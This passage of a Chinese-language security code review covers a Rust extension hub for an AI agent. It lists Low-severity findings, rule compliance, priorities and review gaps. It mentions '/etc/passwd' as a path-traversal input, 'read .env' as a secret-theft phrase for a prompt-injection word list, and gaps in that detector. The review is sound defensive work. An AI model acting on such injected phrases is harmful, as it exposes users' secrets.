if leaf.split(['/', '\\']).any(|seg| seg == ".." || seg.is_empty()) {
    return Err(format!("unsafe skill subdir '{leaf}'"));
}
```

`"/etc/passwd"` 的 split 是 `["", "etc", "passwd"]`，empty segment 检查会拒绝 ✓。但 `"foo/bar"` 中 `bar` 不是 `..`、非空，会通过 —— 之后 `checkout.join(&leaf)` + 后续的 `is_dir()` 是相对 checkout 路径，安全；但**多个 segment 的 subdir** 在 `safe_name = leaf.rsplit(...).next()` 后变成 `"bar"`，意味着 install 后的 `target = skills_dir.join("bar")`，丢失了"foo"层级，**用户期望在 `skills_dir/foo/bar` 安装结果变成 `skills_dir/bar`**。这是功能 bug 而非安全 bug，但应在测试覆盖。

**建议**：leaf 应该强制是单 segment（"the skill's directory name inside the repo"），多 segment 应拒绝并要求 catalog entry 改正。

---

### Low

**L1. `secrets.rs:14-31` — 模块文档引用 `extract_secret_refs` 但本仓库无该函数的可见导出**

```rust
//! enforced by `crate::secrets::extract_secret_refs`
```

`grep` 显示该函数确实在 `src/secrets/`（`src/secrets/mod.rs`），但模块内对外可见性需核对。本 review 不展开（不在 hub 范围）。仅作记录。

**L2. `mod.rs:1-23` — 模块文档是设计 spec 的链接而非自包含描述，新人 onboarding 需要跳转多个 docs/**

```rust
//! Unified Extensions Hub: one user-facing `Extension` concept over the
//! existing plugin / MCP / skill backends, fed by the single published Aleph
//! Hub catalog. See
//! docs/superpowers/specs/2026-06-20-aleph-hub-single-source-design.md
```

跨仓库链接（`docs/superpowers/...`）的稳定性依赖 docs repo。建议在 `mod.rs` 顶部加 5-10 行的「Hub in 60 seconds」自包含摘要：入口边界（HTTP/文件）、核心 invariant（trust ceiling、sha256 gate、ack gate、SSRF guard）、失败语义（fail-closed）。

**L3. `official_mcp.rs:96` (`map_entry`) — `repo_url: None`** 而 Hub catalog 入口要求所有 entry 至少 `Option<String>`**

```rust
repo_url: None,
```

这意味着 primer 投影的所有 MCP entry 在 cache 里 `repo_url` 为空。Panel 可能用 `repo_url` 渲染"开源 / 第三方出处"信息，MCP 官方 server 缺失这一字段，UI 会回退到空字符串或被误解为"未提供出处"。

**建议**：在 `map_entry` 中填入 `repo_url: Some(format!("https://github.com/{owner}/{preset-id}"))`（若 catalog 提供 owner），或显式 `"aleph-internal"` 占位。

**L4. `catalog_client.rs:188-216` (`ingest`) — `entry.requires_config = he.install_spec.requires_config()` 已经在 hub_catalog.rs:131 重算，但 `into_entry` 接受的是 `self.requires_config` 默认值**

`HubCatalogEntry::into_entry`（`hub_catalog.rs:126-138`）：

```rust
requires_config: self.install_spec.requires_config(),
```

已经重算 ✓。但 `HubCatalogEntry.requires_config` 字段（`hub_catalog.rs:64`）仍保留且 wire 可控；它**未被 `into_entry` 使用**（被 `install_spec.requires_config()` 覆盖）。

→ 字段死代码。攻击者也无法通过它影响行为（因为覆盖），但留着会让维护者困惑（"wire 声明的 requires_config 生效吗？"）。

**建议**：删除 `HubCatalogEntry.requires_config` 字段或加 `#[serde(default)]` 并明确文档："wire 声明的 requires_config 仅供参考，最终值从 install_spec 重算"。

**L5. `catalog_client.rs:46-100` (`sanitize_generated_at`) — 自实现 RFC3339 校验，易错**

`%Y-%m-%dT%H:%M:%S%.%f%z` 的手写校验虽然小心（位置化 byte check），但缺乏完整的日历校验（如月份 13、日期 32、闰年）。同时 `2026-07-30T00:00:00+99:99` 会被接受。

**风险**：仅作为 freshness signal，无安全影响。但脆性代码会成为未来维护者负担。

**建议**：引入 `chrono` / `time` crate 做 RFC3339 parse + 校验（项目已经依赖 chrono 在多处使用，可参考 `discovery/`）。

**L6. `install.rs:218` (`marketplace.install_to_scope(...)`) — `plugin_marketplace_name(&ctx.entry.source_id)` 允许**任意 source_id** 解析到任意 marketplace**

```rust
fn plugin_marketplace_name(source_id: &str) -> Option<&str> {
    match source_id {
        ALEPH_HUB_ID => Some(BUILTIN_MARKETPLACE_NAME),
        "local" => None,
        other => Some(other),
    }
}
```

如果一个 catalog entry 把 `source_id` 设为 `"aleph-official"`（恰好是 builtin marketplace 的名字 —— **巧合**但合法），它的安装路径会走到 builtin marketplace，与官方 plugin 同名时**互相覆盖**。同时若 source_id 含 `/` `..` 等特殊字符，`marketplace.install_to_scope` 内部会校验（`extension/marketplace/mod.rs:332-340`），但走到 `install_to_scope` 之前不会校验 `marketplace_name` 的格式。

**建议**：在 `plugin_marketplace_name` 加 marketplace name 白名单（"aleph-official" + 配置中已注册的市场名）。

**L7. `reconcile.rs:130-137` (`installed_entry` 测试 helper) — 测试中重设了 `source_id: "local"` 与 `via: None`，但实际 `reconcile` 不修改 catalog entry 的 `via`**

`mark_installed_state` 只修改 `installed` / `enabled` / `update_available`，**不**修改 `via` / `source_id` / `name` / `description`。这意味着 reconcile 不会让 catalog entry 反映"它正在被当作已安装"，但同时也无法在 UI 上让用户知道哪个 installed 路径映射到了 catalog entry —— 即 catalog UI 的"Installed"tab 与 "Browse"tab 的 entry 之间的关系**只能通过 `update_available` badge 间接体现**。

设计意图（来源注释 `reconcile.rs:6-12`）是 "ledger answers 'what we installed'; live reconciliation answers 'what is installed'"，这是对的。

**建议**：在 `extensions.catalog` 响应里加 `installed_backend` 字段（"this entry is installed as `local:mcp:aleph-hub_github`"），让 Panel 可在 hover 时显示 backend id。

**L8. `official_skills.rs:63-69` (`primer_entries`) — `dir.files().find(|f| ... SKILL.md)` 后立刻 `parse_skill_content`，但 dir.files() 可能来自 `include_dir!`，大型 SKILL.md 会被一次性读入**

`include_dir` 在 build-time 嵌入二进制，运行时访问 `contents_utf8()` 返回 `&str`。对单个 SKILL.md 几十 KB 没有问题，但如果某个 skill 误把二进制文件以 `.md` 命名（PNG 重命名）或者 SKILL.md > 1 MB，会进入 `parse_skill_content` 解析。

**风险**：性能与解析失败。无安全影响。

**建议**：限制 SKILL.md 大小上限（如 256 KiB）作为防御性编程。

**L9. `verify.rs:84-86` (`running_with_only_resources_is_ok`) — 测试断言"resources-only MCP server is ok"，但**真实威胁面**是 adversarial 资源（恶意图片/二进制）通过 resources 通道进入**

资源模板和 prompt 内容在 `mcp/manager/types.rs` 通过 `resource_count`/`prompt_count` 计数，但**没有 content 扫描**。`content_sanitizer`（`security/content_sanitizer.rs`）是否对 MCP resources 生效需要在 mcp/manager 内部确认。

**建议**：确保 MCP resources 在返回到 agent 前也走 `content_sanitizer`（尤其是 prompt 与 resource template 的内容）；若未生效是 mcp/manager 的责任而非 hub。

**L10. `trust.rs:154-181` (`SUSPICIOUS` 词表) — 文档明确说明"locale coverage is shallow on purpose"，但**没有机制**让用户报告新的 attack 样本触发词表更新**

```rust
// Locale coverage here is shallow on
// purpose: list grows when a real attack sample surfaces, not on spec.
```

如果出现新绕过（如日语 prompt injection）→ 没有反馈渠道，词表更新依赖下一次 hub release。

**建议**：在 `InjectionFinding { kind: "suspicious_phrase", .. }` 之外加 `kind: "near_miss"`（如 `read .envx` 接近 `read .env`），让 UI 可以建议"是否上报此 sample"。

**L11. `secrets.rs:42-46` (`secret_ref`) — 不验证 `name` 的合法性**

```rust
pub fn secret_ref(name: &str) -> String {
    format!("{{{{secret:{name}}}}}")
}
```

如果 caller 传入非法 name（含 `{`/`}`），会生成 `{{secret:foo{}}}` 这种**不能被 `extract_secret_refs` 解析**的字符串。`secret_resolver.rs::resolve_secret_map`（`mcp/manager/secret_resolver.rs:42-63`）在解析失败时**drop key**，fail-closed，所以无安全影响，但 install 路径会把无意义的 ref 写入 mcp_config.json。

**建议**：在 `secret_ref` 内 assert name 通过 `sanitize`（或返回 `Result`）。

**L12. `reconcile.rs:148-181` (`installed_entry` / `mcp_pair` 测试 helper) — 测试 helper 模仿 live backend 数据，**没有覆盖** `health = HealthStatus::Restarting` / `Unhealthy` / `Dead` 在 reconcile 中的语义**

`mcp_to_entry`（`reconcile.rs:58-64`）：

```rust
pub fn mcp_to_entry(info: &McpServerInfo) -> ExtensionEntry {
    let mut e = base_entry(ExtensionKind::Mcp, &info.id, info.name.clone());
    e.enabled = !matches!(info.health, HealthStatus::Stopped | HealthStatus::Dead);
    e
}
```

`Restarting` / `Unhealthy` / `Degraded` 都映射到 `enabled = true`。Verify 路径会分别视它们为 running / not running（verify.rs:97-103）。两个模块对 `HealthStatus::Degraded` 的判定一致（都视为"运行但 degraded"），但 `Unhealthy` 在 reconcile 里 enabled=true 而 verify 里 running=false —— **UI 可能显示 "installed & enabled" 但 verify 报 "not running"**。

**建议**：reconcile 端的 enabled 应与 verify 端的 running 一致—— `e.enabled = !matches!(info.health, Stopped | Dead | Unhealthy)`，或者把语义集中到 `HealthStatus::is_user_facing_running()` 一个 helper。

---

## 架构红线合规快照

| 红线 | 状态 | 说明 |
|------|------|------|
| R1 core 不调平台 API | ✅ | hub 全部 std + reqwest + libgit2（vendored）+ rusqlite；零平台 API |
| R2 原生 shell 仅窗口容器 | ✅ | 无 UI 代码 |
| R3 core 极简、无重依赖 | ✅ | `Cargo.toml` 新增依赖：0；hub 仅依赖 reqwest（已有）、rusqlite（已有）、sha2（已有）、serde/schemars（已有）、which、include_dir、git2（已有）、tokio、async-trait |
| R4 接口层纯 I/O | ✅ | 全部纯函数 / 薄 DB 包装；唯一带副作用的入口（`extensions.install`）在 `gateway/handlers/extensions/install.rs`，hub 模块不持有状态 |
| R7 Rust Core 唯一大脑 | ✅ | `is_legacy_preset_server` / `build_disclosure` / `mark_installed_state` 等决策在 hub，跨模块复用 |
| R8 正则仅用于机器格式 | ✅ | `sanitize_generated_at`（RFC3339 字节级校验）、`is_valid_owner_repo`（GitHub slug）、`acceptable_git_url`（URL scheme）；无 LLM/route intent |
| R9 可配置项暴露为工具 | ✅ | `hub_catalog_sync`、`hub_install_run`、`hub_install_verify` 三个 builtin tools；hub 模块本身无配置项 |
| R10 智能在 prompt 中 | ✅ | `scan_for_injection` 是机器可识别的 byte-level + phrase scan，无启发式 |

## 整体评价

**设计层做得不错**：默认 fail-closed（trust ceiling、sha256 gate、ack gate、SSRF guard、empty catalog 保留 last-good），且大部分安全相关假设都被显式 doc 注释记录（"Previously this used `SsrfPolicy::disabled()`, which waived all IP checks and was a DNS-rebinding SSRF bypass"）。代码风格统一，测试覆盖到位。

**核心供应链假设偏弱**：
- 官方插件/技能的发布链路（GitHub `rootazero/Aleph-skills`/`Aleph-plugins`）**没有任何 content pin**（C1）；
- Hub catalog 本身**没有数字签名**（C3），TLS 是唯一信任根；
- 三方 catalog 接受 `git@host:` 形式的 URL（SSH-Trust-On-First-Use）（C2）。

在 R10（"智能在 prompt 中"）+ 模块复用 `security/ssrf` + `security/unicode_guard` + `secret_resolver` 的设计下，**单条 install 调用本身的代码质量不差**——主要风险集中在「信任根的选择」与「verify 路径的严格性不足」（H1, H5, H6）。

**建议优先级**：
1. **P0 立即修**：C1（官方插件/技能加 sha256 pin）、C2（收紧 `acceptable_git_url`）、H1（verify 对 symlink 防御）、H2（vault key 唯一性）
2. **P1 短期**：C3（catalog signature）、H3（injection 覆盖 tags/author/via）、H4（ack gate 扩展）
3. **P2 中期**：H5/H6 reconcile collision、M1 schema 校验、M9 legacy preset 误杀面
4. **P3 收尾**：Medium/Low 列表项，文档与一致性修复

---

## 未做的事（明确记录）

1. **没有审查 hub 模块的 wasm/LLM 渲染侧**（Panel/Leptos 是否对 `via`/`source_label`/`description` 做 HTML escape）。这些在 `desktop/`、`interfaces/webchat/`、`interfaces/tui/`，本 review 未涉及。
2. **没有审查 `mcp/manager/*` 的 secret 注入 pipeline**（`secret_resolver.rs` 是阅读过但非审查目标）。`install.rs` 与 `mcp/manager/secret_resolver.rs` 的接口约定正确（fail-closed drop unresolved）。
3. **没有审查 `bundled/extractor.rs` 的整体 embed 流程**（startup hot path、`sync_official_now` 的失败语义）。仅 `install.rs` / `official_*.rs` 与之的接口合约被审。
4. **没有审查 `extension/marketplace/mod.rs` 的 plugin lifecycle**（uninstall/reload 并发）。仅读了 `install_to_scope` 与 `verify_plugin_integrity`。
5. **没有审查 catalog 实际 publisher 侧的策略**（`rootazero/Aleph-skills` 仓库管理流程、Hub artifact 审计机制）。本 review 仅看消费端。
6. **没有审查 `bin/aleph-server/commands/start/mod.rs` 的 hub 启动 wiring**（仅读取 `start/mod.rs:1080-2010` 关键 100 行以验证 wiring，不展开）。
7. **没有运行 `cargo check` / `cargo clippy` / `cargo test`**——用户要求仅静态阅读。
8. **没有验证 Cargo.lock 与 Cargo.toml 的实际 feature 一致性**（`reqwest 0.12 + native-tls` 是从 Cargo.toml 看到，未验证 reqwest 默认 `danger_accept_invalid_certs = false`，这是 reqwest 文档默认值假设）。
9. **没有审查 `extension/discovery/install*`（如 `extensions.installed` 的 Panel side rendering）**——H6 的 collision 影响依赖具体 UI 行为。
10. **没有审查 `security/unicode_guard` 自身的覆盖范围**——本 review 信任其作为 SSOT，仅检查 hub 端是否正确调用。

---

*报告生成于 2026-08-20，基于 commit `.worktrees/review-modules` 的 `src/hub/` 全量阅读 + 跨模块抽样核查。*